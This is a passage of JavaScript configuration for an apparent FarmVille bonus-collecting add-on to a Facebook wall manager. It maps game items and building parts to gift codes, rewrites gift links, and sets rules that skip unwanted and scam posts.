		var t30 = createAccTextFromArray(sheepTypes,"adopt_ewe"," Ewe");
		var t16 = createAccTextFromArray(cowTypes,"adopt_cow"," Cow");
		var t17 = createAccTextFromArray(eggTypes,"egg_"," Mystery Egg");
		var t18 = createAccTextFromArray([].concat(otherAnimals,babyAnimals,animalCatchalls),"adopt_","");
		var t19 = createAccTextFromArray(buildings,"mat_"," Parts");
		var t20 = createAccTextFromArray(questItems,"send","");
		var t32 = createAccTextFromArray(eggTypes2,"egg_"," Egg");
		var t33 = createAccTextFromArray(avatar, "costume_"," Costume");
		var t35 = createAccTextFromArray(dnaTypes,"dna_"," DNA Strand");
		var t37 = createAccTextFromArray(gemTypes,"gem_"," Gem");
		var t36 = createAccTextFromArray(bulbTypes,"bulb_"," Bulb");
		var t38 = createAccTextFromArray(scaleTypes,"scale_"," Dragon Scale");
		var t39 = createAccTextFromArray(serumTypes,"serum_"," Monster Serum");
		var t40 = createAccTextFromArray(cuttingTypes,"cutting_"," Bonsai Cutting");
		var t41 = createAccTextFromArray(spiritTypes,"spirit_"," Animal Spirit");
		var t42 = createAccTextFromArray(fossilTypes,"fossil_"," Fossil");
		var t43 = createAccTextFromArray(pixieTypes,"pixie_"," Pixie Dust");

		//use t21 below to create your own accTexts for non-arrayed items or for other special needs
		var t21 = {
			sendmat:"Material",sendbushel:"Bushel",order:"Unknown Bushel Order",sendhelp:"Help",bushel_random:"Random Bushel",
			grabbag:"Grab Bag","100xp":"XP",adopt_lambewe:"Lamb (Ewe)",adopt_lambram:"Lamb (Ram)",tree_ornament2:"Ornament Tree II",
			wanderingstallion:"Wandering Stallion",adopt_lamb:"Lamb (Unknown Sex)",adopt_piglet:"Piglet", tree:"Unknown Tree",
			luckypenn:"Lucky Penny",bushel:"Unknown Bushel",perfectbunch:"Perfect Bunch",pollinated:"Unknown Seeds",sendbasket:"Basket",
			adopt_ramfloweredgreen:"Flowered Green Ram",sample:"Unknown Level Sample",sample1:"Sample Level 1-20",sample2:"Sample Level 21-40",
			sample3:"Sample Level 41-80",sample4:"Sample Level 81-100",sample5:"Sample Level 100+", schoolsupp:"School Supply",
			wildlife_rare:"Wildlife Baby (Rare)",wildlife_common:"Wildlife Baby (Common)",petrun_common:"Mystery Baby (Common)",
			petrun_rare:"Mystery Baby (Rare)",zoo_common:"Zoo Baby (Common)",zoo_rare:"Zoo Baby (Rare)",aviary_rare:"Egg (Rare)",
			aviary_common:"Egg (Common)",livestock_common:"Mystery Baby (Common)",livestock_rare:"Mystery Baby (Rare)",
			sendwishlist:"Wishlist",sendfeed:"Animal Feed",sendbottle:"Bottle",arctic_common:"Winter Baby (Common)",
			arctic_rare:"Winter Baby (Rare)",unknown_baby:"Unknown Baby",adopt_holidaystbernard:"Holiday St. Bernard",
			sea_common:"Water Baby (Common)",sea_rare:"Water Baby (Rare)",jade_common:"Jade Baby (Common)",jade_rare:"Jade Baby (Rare)",
			ocean_common:"Jade Water Baby (Common)",ocean_rare:"Jade Water Baby (Rare)",join:"Unknown Crafting Team",tarot_past:"Tarot Card (Past)",
			tarot_present:"Tarot Card (Present)",tarot_future:"Tarot Card (Future)",tarotcard:"Tarot Card",bulb_unknown:"Unknown Bloom",
		};

		var t22 = createAccTextFromArray(seedTypes,"seeds_"," Seeds");
		var t23 = createAccTextFromArray(bushelTypes,"polseeds_"," Pollinated Seeds");
		var t29 = createAccTextFromArray(bushelTypes,"order_"," Bushel Orders");

		//use t27 to repair accTexts for screwy test texts before converting to accept texts
		var t27 = {"polseeds_purplepopp":"Purple Poppy Pollinated Seeds",
			"polseeds_orangedais":"Orange Daisy Pollinated Seeds",
			"polseeds_electriclil":"Electric Lily Pollinated Seeds",
			"polseeds_daylil":"Daylily Pollinated Seeds",
			"polseeds_goldenpopp":"Golden Poppy Pollinated Seeds",
			"polseeds_chromedais":"Chrome Daisy Pollinated Seeds",
			"polseeds_sunpopp":"Sun Poppy Pollinated Seeds",
			"bushel_purplepopp":"Purple Poppy Bushel",
			"bushel_orangedais":"Orange Daisy Bushel",
			"bushel_electriclil":"Electric Lily Bushel",
			"bushel_daylil":"Daylily Bushel",
			"bushel_goldenpopp":"Golden Poppy Bushel",
			"bushel_chromedais":"Chrome Daisy Bushel",
			"bushel_sunpopp":"Sun Poppy Bushel",
			"polseeds_purplepopp":"Purple Poppy Perfect Bunch",
			"polseeds_orangedais":"Orange Daisy Perfect Bunch",
			"polseeds_electriclil":"Electric Lily Perfect Bunch",
			"polseeds_daylil":"Daylily Perfect Bunch",
			"polseeds_goldenpopp":"Golden Poppy Perfect Bunch",
			"polseeds_chromedais":"Chrome Daisy Perfect Bunch",
			"polseeds_sunpopp":"Sun Poppy Perfect Bunch",
			"order_purplepopp":"Purple Poppy Bushel Order",
			"order_orangedais":"Orange Daisy Bushel Order",
			"order_electriclil":"Electric Lily Bushel Order",
			"order_daylil":"Daylily Bushel Order",
			"order_goldenpopp":"Golden Poppy Bushel Order",
			"order_chromedais":"Chrome Daisy Bushel Order",
			"order_sunpopp":"Sun Poppy Bushel Order",
		};

		//create the actual attachment
		var attachment={
			appID:thisApp,
			alias:'FV',
			hrefKey:'key',
			name:'FarmVille',
			thumbsSource:'farmville.zgncdn.com',
			flags:{httpsTrouble:true,requiresTwo:false,skipResponse:false,alterLink:true},
		/*	icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc1/v43/144/102452128776/app_2_102452128776_416.gif", //corncob
			icon:"http://fbcdn-photos-a.akamaihd.net/photos-ak-snc1/v85005/144/102452128776/app_2_102452128776_343.gif", //duckhead
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc1/v85005/144/102452128776/app_2_102452128776_3994.gif", //strawberry
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc1/v85005/144/102452128776/app_2_102452128776_3606.gif", //chicken
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc1/v85005/144/102452128776/app_2_102452128776_162286141.gif", //coconut
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc1/v85005/144/102452128776/app_2_102452128776_479416909.gif", //piggy
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_514042832.gif", //sheep
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_188884871.gif", //goat
			icon:"http://fbcdn-photos-a.akamaihd.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_658246637.gif", //orchid
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_1802400414.gif", //watermelon
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_810647710.gif", //tractor
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_1575157638.gif", //barn
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_724451824.gif", //panda
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_1903979455.gif", //flower
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_981457788.gif", //flower2
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_732411100.gif", // xp
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc1/v85005/144/102452128776/app_2_102452128776_4389.gif", //fv
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_302226724.gif", //barn2
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_1935537816.gif", //fv2
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_1452563179.gif", //cow
			icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_81659645.gif", //tractor2
		*/	icon:"http://photos-g.ak.fbcdn.net/photos-ak-snc7/v85005/144/102452128776/app_2_102452128776_1457410780.gif", //fv3
		desc:"FarmVille Sidekick",
			
			//code for altering link destinations before processing (unique to FV at this time)
			alterLink:{
				//find in href
				find:'next=gifts.php%3FgiftRecipient',
				
				//replace with, (note the {%1} in the replacement)
				replace:'next=gifts.php%3FselectedGift%3D{%1}%26giftRecipient',
				
				//words in the post body text
				words:["nail","wooden board","brick","honeybee","vehicle part","smoker","beeswax","blanket","bottle",
					"horseshoe","harness","training their puppy","kibble","watering can","shovels","concrete","hammer",
					"twine","tin sheet","hinge","screwdriver","wrench","pipe","clamps","stone","log","steel beam","wire",
					"water pump","painted wood","shrub","grazing grass","hay bundle","fence post","special delivery",
					"animal feed","saddle","bridle","punch","snacks","paint","red beam","screw","aluminum siding",
					"candy cane beam","conifer dust","ice post","rail spike","rail tie","coal","pickaxe","hair dryer",
					"milk and cookies","gps","silver bell","holiday lights","reindeer treat","holiday cheer","snow brick",
					"snowflake","ice nail","snow globe","ice board","frozen beam","white paste","white overalls",
					"light plywood","black light","blue roller","white paper","teaching their dog","wood stain",
					"scaffolding","masking tape","brush","baby blanket","salt lick","sod piece","wooden peg","feed bucket",
					"water pail","grass seed","raw wood","baby carrot bunch","bunny bed","bunny tunnel","branch ball",
					"wood block","hutch wire","clamp","wood glue","sand paper","awning","basket","price card","twig",
					"potting soil","daffodil","tiny window","toadstool","garden fence","chocolate brick","gumdrop accent",
					"gingerbread siding","lollipop lamp","marshmallow mortar","cotton candy insulation","mini boulder",
					"turf roll","mulch soil","tropical cup","swim suit","beach sandal","lily pad","fishing pole","lure",
					"fuel pipe","level gauger","steel sheet","small axe","boat hook","wheelbarrow","mineral infusion",
					"steam","bed rock","stone pillar","terra cotta","hanging incense","reed thatch","clay brick",
					"bamboo rail","fill dirt","cement","metal post","mystery bulb","floating rock","sparkle seed",
					"magic water","wood plank","sail","rigging","skimmer","water bucket","leaf net","steering wheel",	
					"dog bed","tennis ball","pacifier","baby mobile","cloud brick","enchanted bamboo","hovering charm",
					"scientific scale","massage stone","buffet tray","drift wood","research paper","barnyard shingle",
					"tree incubator","cloning solution","chisel","magic boulder","talisman","ball of wool","java fern",
					"gold dust","mallet","stone pick","cobweb","old fence","deadwood","rusty gear","rusty post","chew toy",
					"thunder cloud","fertilizer stake","mulch","seedling tray","ladle","enchanted iron","gummy tentacle",
					"puffy cloud","magic bubble","life essence","purple roller","wooden cog","wooden shaft","stamp",
					"bearings","carnival light","gondola","windmill blade","wooden giraffe","wooden tiger","wooden zebra",
					"bumper","drying rack","flower apron","green tape","yellow paper","seatbelt","pepper packet","trough",
					"copper tube","drill bit","cut bamboo","bonsai pedestal","bonsai pot","grafting tool","grain of sugar",
					"grain of spice","everything nice","lamp post","bench","cobblestone","lumberjack saw","power saw",
					"mystery horse","mystery tree","mystery bloom","broken thermometer","meteorite","food chain",
					"special soil","clay pot","peat pellet","corporate sponsor","icicle ramp","crystal seed","crystal",
					"water","snow machine",	"mithril ore","star rock","warpstone","sun light rope","moon gem",
					"armillary sphere","fairy dust","magic maple","rain drop","vial of sunlight","magic mushroom",


					"nursery barn","horse paddock","cow pasture","livestock pen","wildlife habitat","aviary","pet run",
					"zoo","winter animal pen","crafting silo","sheep pen","pig pen","orchard","garage","duck pond",
					"horse stable","beehive","cove","winter wonderland train station","santa's sleigh","combine",
					"count duckula's castle","harvest hoedown","winter water wheel","winter pasture","winter paddock",
					"ice palace","crop mastery billboard","winter livestock pen","winter aviary","romantic carriage",
					"winter pet run","winter zoo","animal mastery billboard","tree mastery billboard","baby playpen",
					"baby bunny hutch","recipe mastery billboard","market stall","gnome garden","candy castle",
					"aquarium","grove","beach resort","fishing hole","gas pump","hot spring","mountain palace",
					"jade habitat","jade aviary","jade paddock","jade pasture","jade playpen","jade aquarium",
					"dino lab","jade wildlife pen","jade pet run","jade gnome garden","jade zoo","turtle pen",
					"imperial shipyard","swimming pond","sunshine doghouse","floating castle","floating waterfall",
					"farmhand center","arborist center","dragon lair","haunted house","animal workshop","monster lab",
					"seedling nursery","witchin' cauldron","tree of life","duckula's castle","sally's seed shop",
					"nightmare zoo","horrendous pet run","bumper cars","big windmill","ferris wheel","big barnyard",
					"deadly livestock pen","haunted pasture","bloom mastery billboard","wishing fountain","bonsai garden",
					"holiday square","joyful horse paddock","magic wildlife cave","holiday aviary","extinct animal zoo",
					"herb garden","penguin skate park","crystal garden","rivermist fortress","home mushroom","enchantment shop",
				].fixOrder(),
				
				//change {%1} above to the value below based on found "word" above
				//the values below should be the "code" for the gift item to send
				conversionChart:{
					nail:"nail",woodenboard:"woodenboard",honeybee:"beehive_bee",vehiclepart:"vehiclepart",
					brick:"brick",smoker:"smoker",beeswax:"beeswax",blanket:"blanket",bottle:"bottle",horseshoe:"horseshoe",
					harness:"harness",trainingtheirpuppy:"consume_treat",kibble:"consume_kibble",wateringcan:"wateringcan",
					shovel:"shovel_item_01",concrete:"concrete",hammer:"hammer",twine:"crafting_twine",tinsheet:"tinsheet",
					hinge:"hinge",screwdriver:"screwdriver",wrench:"wrench",pipe:"pipe",clamp:"clamp",stone:"stonepart",
					log:"logpart",steelbeam:"steelbeampart",wire:"component_wire",waterpump:"component_waterpump",
					paintedwood:"component_paintedwood",fencepost:"component_fencepost",grazinggrass:"component_grazinggrass",
					haybundle:"component_haybundle",shrub:"component_shrub",animalfeed:"animalfeedtrough_feed",
					specialdelivery:"socialplumbingmysterygift",saddle:"component_saddle",bridle:"component_bridle",
					punch:"part_punch",snacks:"part_snacks",paint:"part_paint",redbeam:"redbeam",screw:"screws",
					aluminumsiding:"aluminumsiding",candycanebeam:"candy_cane_beam",coniferdust:"ww_fairy_dust",
					icepost:"ww_ice_post",railspike:"railspikepart",railtie:"railtiepart",coal:"coalpart",pickaxe:"pickaxepart",
					hairdryer:"hairdryerpart",milkandcookies:"task_milkandcookies",gps:"task_gps",silverbell:"task_jinglebells",
					holidaylights:"task_holidaylights",reindeertreat:"task_reindeertreat",holidaycheer:"task_holidaycheer",
					goo:"goo",hauntedbrick:"haunted_brick",knockers:"door_knockers",belt:"feedbelt",sack:"feedsack",scoop:"feedscoop",
					snowbrick:"parts_snowbrick",snowflake:"parts_magicsnowflake",icenail:"parts_icenail",snowglobe:"parts_snowglobe",
					iceboard:"parts_iceboard",frozenbeam:"parts_frozenbeam",whiteoveralls:"part_painters_overalls",
					lightplywood:"part_sheet_of_plywood",blacklight:"part_floodlight",whitepaper:"part_roll_of_paper",
					blueroller:"part_paint_roller",whitepaste:"part_bucket_of_paste",love:"parts_love",flowertrim:"parts_flowertrim",
					carriagelamp:"parts_carriagelamps",horsetreat:"parts_horsetreats",fancychocolate:"parts_fancychocolates",
					cozyblanket:"parts_cozyblanket",darkplywood:"task_sheet_of_plywood_recolor",greenlight:"task_floodlight_recolor",
					greenpaper:"task_roll_of_paper_recolor",orangeoveralls:"task_painters_overalls_recolor",
					redroller:"task_paint_roller_recolor",redpaste:"task_bucket_of_paste_recolor",teachingtheirdog:"consume_treat",
					woodstain:"task_woodstain",maskingtape:"task_maskingtape",scaffolding:"task_scaffolding",
					brush:"part_brush",saltlick:"part_saltlick",babyblanket:"part_babyblanket",sodpiece:"part_sod",
					rawwood:"part_raw_wood",feedbucket:"part_feed_bucket",waterpail:"part_water_pail",woodenpeg:"part_wood_peg",
					grassseed:"part_grass_seed",babycarrotbunch:"part_babycarrotbunch",bunnybed:"part_bunnybed",
					branchball:"part_branchball",woodblock:"part_woodblock",hutchwire:"part_hutchwire",bunnytunnel:"part_bunnytunnel",
					clamps:"part_clamps",woodglue:"part_wood_glue",sandpaper:"part_sandpaper",babyfish:"part_babyfish",
					oceanrock:"part_coral",filter:"part_filters",buoy:"part_buoys",smallcrowbar:"feedsmallcrowbar",
					largecrowbar:"feedcrowbar",smallfishingnet:"feedsmallnet",largefishingnet:"feedfishingnet",
					volcanomonitor:"part_volcanicmonitor",stonycoralpiece:"part_stonycoral",awning:"stall_awning",
					basket:"stall_basket",pricecard:"stall_pricecard",toadstool:"part_toadstool",gardenfence:"part_gardenfence",
					daffodil:"part_daffodils",twig:"part_twigs",tinywindow:"part_tinywindow",pottingsoil:"part_pinkpot",
					chocolatebrick:"part_chocolate_bricks",gingerbreadsiding:"part_gingerbread_siding",
					gumdropaccent:"part_gumdrop_accents",lollipoplamp:"part_lollipop_lamps",miniboulder:"part_mini_boulder",
					mulchsoil:"part_mulch_soil",turfroll:"part_turf_roll",marshmallowmortar:"part_marshmallow_mortar",
					cottoncandyinsulation:"part_cotton_candy_insulation",tropicalcup:"feed_r4r_tropical_cups",lilypad:"part_lily_pad",
					beachsandal:"feed_r4r_beachsandals",swimsuit:"feed_r4r_swimmingsuits",lure:"part_lure",fishingpole:"part_fishing_pole",
					fuelpipe:"part_steampipe",levelgauger:"part_levelgauger",steelsheet:"part_steelsheet",smallaxe:"part_smallaxe",
					boathook:"part_boathook",wheelbarrow:"part_wheelbarrow",bedrock:"part_bedrock",steam:"part_steam",
					mineralinfusion:"part_mineralinfusion",terracotta:"part_terracottastatue",hangingincense:"part_hangingincense",
					stonepillar:"part_stonepillar",bamboorail:"part_bamboorail",claybrick:"part_claybrick",reedthatch:"part_reedthatch",
					cement:"part_cement",filldirt:"part_filldirt",metalpost:"part_metalpost",mysterybulb:"part_flowerfood",
					floatingrock:"part_floatingrocks",magicwater:"part_magicwater",sparkleseed:"part_sparkleseeds",
					rigging:"part_rigging",sail:"part_sail",woodplank:"part_woodboard",skimmer:"part_skimmer",leafnet:"part_leafnet",
					waterbucket:"part_waterbucket",tennisball:"part_dogball",dogbed:"part_dogbed",chewtoy:"part_dogtoy",
					babyblanket:"part_babyblanket2",babymobile:"part_mobiles",pacifier:"part_pacifier",cloudbrick:"part_cloudbrick",
					enchantedbamboo:"part_enchantedbamboo",hoveringcharm:"part_hoveringcharm",scientificscale:"part_scale",
					massagestone:"part_massagestones",buffettray:"part_buffettray",driftwood:"part_driftwood",pottingsoil:"part_pottingsoil",
					javafern:"part_javafern",researchpaper:"part_researchpaper",treeincubator:"part_treeincubator",
					cloningsolution:"part_cloningsolution",talisman:"part_talisman",chisel:"part_chisel",magicboulder:"part_magicboulder",
					stamp:"part_stamps",ballofwool:"part_ballofwool",golddust:"part_golddust",stonepick:"part_pickaxe2",mallet:"part_mallet",
					cobweb:"part_cobweb",deadwood:"part_deadwood",oldfence:"part_ironfence",thundercloud:"part_lightning",
					rustypost:"part_rustyPost",rustygear:"part_rustyGear",fertilizerstake:"part_fertilizerstakes",mulch:"part_mulch",
					seedlingtray:"part_seedlingtrays",ladle:"part_ladle",enchantediron:"part_enchantediron",
					gummytentacle:"part_gummytentacles",lifeessence:"part_lifeessence",magicbubble:"part_magicbubbles",
					puffycloud:"part_puffyclouds",purpleroller:"task_paint_roller_recolor_purple",woodencog:"part_woodencogs",
					woodenshaft:"part_woodenshafts",barnyardshingle:"part_barnyardshingles",bearings:"part_bearings",gondola:"part_gondola",
					carnivallight:"part_carnivallights",trough:"part_trough",windmillblade:"part_windmillblades",woodengiraffe:"part_woodengiraffe",
					woodentiger:"part_woodentiger",woodenzebra:"part_woodenzebra",bumper:"part_bumper",dryingrack:"part_dryingrack",
					flowerapron:"part_flowerapron",greentape:"part_masking_tape_green",yellowpaper:"part_roll_of_paper_yellow",
					seatbelt:"part_seatbelt",pepperpacket:"part_seedpackets",steeringwheel:"part_steeringwheel",slopbucket:"part_slopbucket",
					cutbamboo:"wishingfountain_bamboo",drillbit:"wishingfountain_drill",coppertube:"wishingfountain_tube",
					bonsaipedestal:"part_bonsaipedestal",bonsaipot:"part_bonsaipot",graftingtool:"part_graftingtool",lamppost:"part_lamppost",
					cobblestone:"part_cobblestone",bench:"part_bench",everythingnice:"part_everythingnice",grainofsugar:"part_sugar",
					grainofspice:"part_spice",lumberjacksaw:"part_lumberjacksaw",powersaw:"part_powersaw",mysterybloom:"part_mysterybloomicon",
					mysteryhorse:"part_mysteryhorseicon",mysterytree:"part_mysterytreeicon",claypot:"part_claypot",specialsoil:"part_specialsoil",
					peatpellet:"part_peatpellet",meteorite:"part_meteorite",brokenthermometer:"part_broken_thermometer",foodchain:"part_food_chain",
					corporatesponsor:"part_corporatesponsor",icicleramp:"part_icicleramp",snowmachine:"part_snowmachine",crystalseed:"part_crystalseeds",
					crystal:"part_crystals",water:"part_water",mithrilore:"part_mithrilore",starrock:"part_starrock",warpstone:"part_warpstone",
					fairydust:"part_fairydust",magicmaple:"part_magicmaple",raindrop:"part_raindrops",armillarysphere:"part_armillarysphere",
					moongem:"part_moongems",sunlightrope:"part_sunlightrope",magicmushroom:"part_magicmushrooms",vialofsunlight:"part_vialofsunlight",

					nurserybarn:"woodenboard,nail,brick,blanket,bottle",craftingsilo:"tinsheet,hinge,screwdriver",
					beehive:"woodenboard,nail,brick,beeswax,smoker",horsestable:"woodenboard,brick,nail,horseshoe,harness",
					cove:"logpart,stonepart,steelbeampart",winterwonderlandtrainstation:"coalpart,railtiepart,railspikepart",
					"santa'ssleigh":"task_holidaylights,task_jinglebells,task_gps,task_holidaycheer,task_reindeertreat,task_milkandcookies",
					orchard:"woodenboard,brick,nail",sheeppen:"woodenboard,brick,nail",zoo:"component_shrub,wrench,pipe",
					winteranimalpen:"ww_ice_post,ww_fairy_dust,candy_cane_beam",pigpen:"woodenboard,brick,nail",
					horsepaddock:"logpart,component_bridle,component_saddle",cowpasture:"component_haybundle,tinsheet,stonepart",
					petrun:"component_paintedwood,component_waterpump,compoent_fencepost",duckpond:"shovel_item_01,wateringcan",
					wildlifehabitat:"component_fencepost,component_shrub,component_grazinggrass",aviary:"clamp,hinge,screwdriver",
					livestockpen:"component_waterpump,component_wire,steelbeampart",combine:"vehiclepart",garage:"woodenboard,brick,nail",
					harvesthoedown:"part_punch,part_snacks,part_paint","duckula'scastle":"goo,haunted_brick,door_knockers",
					winterwaterwheel:"task_snowgear,task_snowchains,task_snowaxle",winterpaddock:"logpart,component_bridle,component_saddle",
					winterpasture:"component_haybundle,tinsheet,stonepart",animalfeedmill:"feedsack,feedscoop,feedbelt",
					icepalace:"parts_snowbrick,parts_magicsnowflake,parts_icenail,parts_snowglobe,parts_iceboard,parts_frozenbeam",
					cropmasterybillboard:"part_painters_overalls,part_sheet_of_plywood,part_floodlight,part_roll_of_paper,part_paint_roller,part_bucket_of_paste",
					romanticcarriage:"parts_love,parts_flowertrim,parts_carriagelamps,parts_horsetreats,parts_fancychocolates,parts_cozyblanket",
					winterlivestockpen:"component_waterpump,component_wire,steelbeampart",winteraviary:"clamp,hinge,screwdriver",
					winterpetrun:"component_paintedwood,component_waterpump,compoent_fencepost",winterzoo:"component_shrub,wrench,pipe",
					animalmasterybillboard:"task_sheet_of_plywood_recolor,task_floodlight_recolor,task_roll_of_paper_recolor,task_painters_overalls_recolor,task_paint_roller_recolor,task_bucket_of_paste_recolor",
					treemasterybillboard:"task_woodstain,task_scaffolding,task_maskingtape",babyplaypen:"part_brush,part_saltlick,part_babyblanket",
					babybunnyhutch:"part_babycarrotbunch,part_bunnytunnel,part_branchball,part_hutchwire,part_woodblock,part_bunnybed",
					recipemasterybillboard:"part_clamps,part_wood_glue,part_sandpaper",volcanoreef:"part_babyfish,part_volcanicmonitor,part_stonycoral",
					aquarium:"part_buoys,part_filters,part_coral",marketstall:"stall_awning,stall_basket,stall_pricecard",
					islandpaddock:"logpart,component_bridle,component_saddle",islandpasture:"component_haybundle,tinsheet,stonepart",
					islandlivestock:"component_waterpump,component_wire,steelbeampart",islandzoo:"component_shrub,wrench,pipe",
					islandpetrun:"component_paintedwood,component_waterpump,compoent_fencepost",islandaviary:"clamp,hinge,screwdriver",
					islandhabitat:"component_fencepost,component_shrub,component_grazinggrass",fishinghole:"part_lure,part_lily_pad,part_fishing_pole",
					gnomegarden:"part_toadstool,part_gardenfence,part_tinywindow",grove:"part_mini_boulder,part_mulch_soil,part_turf_roll",
					candycastle:"part_chocolate_bricks,part_gingerbread_siding,part_gumdrop_accents,part_lollipop_lamps,part_marshmallow_mortar,part_cotton_candy_insulation",
					beachresort:"feed_r4r_tropical_cups,feed_r4r_beachsandals,feed_r4r_swimmingsuits",gaspump:"part_steampipe,part_levelgauger,part_steelsheet",
					hotspring:"part_bedrock,part_steam,part_mineralinfusion",mountainpalace:"part_stonepillar,part_hangingincense,part_terracottastatue",
					jadehabitat:"part_reedthatch,part_bamboorail,part_claybrick",jadepasture:"component_haybundle,tinsheet,stonepart",
					jadeplaypen:"part_brush,part_saltlick,part_babyblanket",jadeaviary:"clamp,hinge,screwdriver",
					jadeaquarium:"part_buoys,part_filters,part_coral",jadepaddock:"logpart,component_bridle,component_saddle",
					dinolab:"part_cement,part_filldirt,part_metalpost",jadepetrun:"component_paintedwood,component_waterpump,compoent_fencepost",
					jadewildlifepen:"component_fencepost,component_shrub,component_grazinggrass",jadezoo:"component_shrub,wrench,pipe",
					jadegnomegarden:"part_toadstool,part_gardenfence,part_tinywindow",floatingwaterfall:"part_floatingrocks,part_magicwater,part_sparkleseeds",
					imperialshipyard:"part_rigging,part_sail,part_woodboard",swimmingpond:"part_skimmer,part_waterbucket,part_leafnet",
					sunshinedoghouse:"part_dogball,part_dogbed,part_dogtoy",babynursery:"part_babyblanket2,part_mobiles,part_pacifier",
					floatingcastle:"part_cloudbrick,part_enchantedbamboo,part_hoveringcharm",turtlepen:"part_driftwood,part_pottingsoil,part_javafern",
					farmhandcenter:"part_scale,part_massagestones,part_buffettray",arboristcenter:"part_researchpaper,part_treeincubator,part_cloningsolution",
					dragonlair:"part_talisman,part_chisel,part_magicboulder",hauntedmansion:"part_cobweb,part_deadwood,part_ironfence",
					monsterlab:"part_lightning,part_rustyPost,part_rustyGear",seedlingnursery:"part_fertilizerstakes,part_mulch,part_seedlingtrays",
					"witchin'cauldron":"part_ladle,part_enchantediron,part_gummytentacles",treeoflife:"part_lifeessence,part_magicbubbles,part_puffyclouds",
					"sally'sseedshop":"part_dryingrack,part_flowerapron,part_seedpackets",nightmarezoo:"component_shrub,wrench,pipe",
					horrendouspetrun:"component_paintedwood,component_waterpump,compoent_fencepost",hauntedpasture:"component_haybundle,tinsheet,stonepart",
					deadlylivestockpen:"component_waterpump,component_wire,steelbeampart",bumpercars:"part_seatbelt,part_bumper,part_steeringwheel",
					bigwindmill:"part_windmillblades,part_woodencogs,part_woodenshafts",ferriswheel:"part_gondola,part_bearings,part_carnivallights",
					bigbarnyard:"part_trough,part_slopbucket,part_barnyardshingles",bloommasterybillboard:"part_masking_tape_green,part_roll_of_paper_yellow,task_paint_roller_recolor_purple",
					wishingfountain:"wishingfountain_bamboo,wishingfountain_drill,wishingfountain_tube",bonsaigarden:"part_bonsaipedestal,part_bonsaipot,part_graftingtool",
					holidaysquare:"part_cobblestone,part_bench,part_lamppost",animalworkshop:"part_sugar,part_spice,part_everythingnice",
					joyfulhorsepaddock:"logpart,component_bridle,component_saddle",magicwildlifepen:"component_fencepost,component_shrub,component_grazinggrass",
					holidayaviary:"clamp,hinge,screwdriver",herbgarden:"part_claypot,part_specialsoil,part_peatpellet",extinctanimalzoo:"part_food_chain,part_meteorite,part_broken_thermometer",
					penguinskatepark:"part_corporatesponsor,part_icicleramp,part_snowmachine",crystalgarden:"part_crystals,part_crystalseeds,part_water",
					enchantmentshop:"part_armillarysphere,part_moongems,part_sunlightrope",homemushroom:"part_fairydust,part_magicmaple,part_raindrops",
					rivermistfortress:"part_mithrilore,part_starrock,part_warpstone",
				}
			},

			//merge accept texts from dynamically created lists above
			accText: mergeJSON(t1,t2,t3,t4,t5,t6,t7,t8,t9,t10,t11,t12,t13,t14,t15,t16,t17,t18,t19,t20,t21,t22,t23,t29,t27,t30,t31,t32,t33,t34,t35,t36,t37,t38,t39,t40,t41,t42,t43),

			//tests for bonuses
			//see http://fbwm.wikia.com/wiki/Sidekick_Tutorial for in depth how-to instructions
			//changing the order of some of these tests will break this script
			tests: [
				//link excludes
				{ret:"exclude", link:[
					"Play FarmVille now","View full size!","feed their chickens","fertilize their crops",
					"start trading!","visit trading","Join them now","Accept as Neighbor",
					"visit","Join their Co-op","Help with the job","donate",
				]},
				
				//just say no to scam posts
				{ret:"exclude",url:[
					"www.facebook.com/pages/","Farmville.Nation","Farmville.Universe","Farmville.INC","Fv.Help","bit.ly",
					"FarmPrizes","Fv.Avg.Plane","FvWorld","zFarmvilleHelper","bit.ly","FarmvilleLatestHelpers",
					"FarmVille.Fans","FVstuffs","Zynga.Farmville.World","Farmville.Genious","Yes.I.Love.You.XD","FVBonus",
					"Farmville.Breeders","ZyngaFarmVilleFans","FarmvilleDailyNews","{*reward_link*}","&next=index.php",
					"FarmVilleAwesomePrizes","farmville-feed-blog.blogspot.com","FarmvilleJadeFallss"
				]},

				//body excludes
				{ret:"exclude", search:["title","caption"],find:[
					"just planted their mystery tree seedling and could use help watering them",
					"found some extra bags of fertilizer","just Unwithered your crops!","posted a new comment on your farm",
					"wants to help you farm faster","just posted a note on your farm","gave up city livin' to become a farmer",
					"opened a Mystery Box and found","wants you to be their neighbor","has created a fantastic farm",
					"could use some gifts","is having a great time playing","is playing FarmVille on the iPhone",
					"is playing FarmVille on the iPad","has a new look!","found a lost pig with your name on her collar",
					"needs help harvesting a Bumper Crop",
				]},
								
				{link:"Get TWO",ret:"none",kids:[
					{search:["link","title","caption"],find:"arajir dragon",ret:"adopt_arajirdragon"},
					{search:["link","title","caption"],find:"furilich dragon",ret:"adopt_furilichdragon"},
					{search:["link","title","caption"],find:"danomire dragon",ret:"adopt_danomiredragon"},
					{search:["link","title","caption"],find:"blue lawn chair",ret:"bluelawnchair"},
